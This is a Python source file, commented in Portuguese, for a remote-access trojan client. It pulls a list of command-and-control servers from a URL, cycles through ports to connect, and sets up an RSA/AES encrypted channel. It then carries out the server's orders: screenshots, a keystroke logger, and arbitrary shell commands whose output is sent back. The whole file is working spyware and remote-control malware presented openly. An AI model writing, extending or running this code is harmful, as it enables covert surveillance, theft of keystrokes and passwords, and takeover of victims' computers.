import socket
import os
import requests
import time
import json
import hashlib
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from PIL import ImageGrab  # Para captura de tela
import threading
import keyboard  # Para keylogger

C2_SERVER_URL = "http://example.com/mirrors.json"  # URL para pegar novos mirrors
REFRESH_MIRRORS_INTERVAL = 600  # Tempo em segundos para atualizar lista de mirrors (10 minutos)
PORTS = [9999, 8888, 7777, 6666, 5555, 4444, 3333, 2222, 1111, 1234]  # Lista de 10 portas
aes_key = None

# Função para criptografar AES
def encrypt_aes(message):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return iv + encryptor.update(message.encode())

# Função para descriptografar AES
def decrypt_aes(ciphertext):
    iv = ciphertext[:16]
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext[16:]).decode()

# Função para autenticação RSA
def authenticate(client_socket):
    global aes_key
    
    # Receber chave pública do C2
    public_key_pem = client_socket.recv(1024)
    public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())

    # Gerar chave AES e criptografá-la com RSA
    aes_key = os.urandom(32)
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    
    # Enviar chave AES criptografada
    client_socket.send(encrypted_aes_key)

# Função para captura de tela
def capture_screen():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")

# Função de keylogger
def keylogger():
    log = ""
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            log += event.name
        with open("keylog.txt", "w") as log_file:
            log_file.write(log)

# Função para atualizar lista de hosts (mirrors) remotamente
def update_mirrors():
    try:
        response = requests.get(C2_SERVER_URL)
        if response.status_code == 200:
            mirrors = response.json().get("mirrors", [])
            return mirrors
    except Exception as e:
        print(f"Erro ao atualizar mirrors: {e}")
    return []

# Função para conectar a múltiplos hosts e portas
def connect_to_c2(hosts):
    for host in hosts:
        for port in PORTS:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((host, port))

                # Autenticação com RSA e troca de chave AES
                authenticate(client)
                print(f"Conectado e autenticado em {host}:{port}.")

                while True:
                    encrypted_command = client.recv(4096)
                    command = decrypt_aes(encrypted_command)

                    if command == 'screenshot':
                        capture_screen()
                        with open("screenshot.png", "rb") as img_file:
                            img_data = img_file.read()
                        client.send(encrypt_aes(img_data.decode("latin1")))

                    elif command == 'keylog':
                        keylogger_thread = threading.Thread(target=keylogger)
                        keylogger_thread.start()
                        client.send(encrypt_aes("Keylogger iniciado"))

                    else:
                        output = os.popen(command).read()
                        client.send(encrypt_aes(output))

            except Exception as e:
                print(f"Erro ao conectar em {host}:{port}: {e}")
            finally:
                client.close()

# Função principal do cliente
def main():
    hosts = ["127.0.0.1"]  # Lista inicial de hosts
    last_mirror_update = 0

    while True:
        current_time = time.time()
        if current_time - last_mirror_update > REFRESH_MIRRORS_INTERVAL:
            new_mirrors = update_mirrors()
            if new_mirrors:
                hosts = new_mirrors
            last_mirror_update = current_time

        connect_to_c2(hosts)

if __name__ == "__main__":
    main()
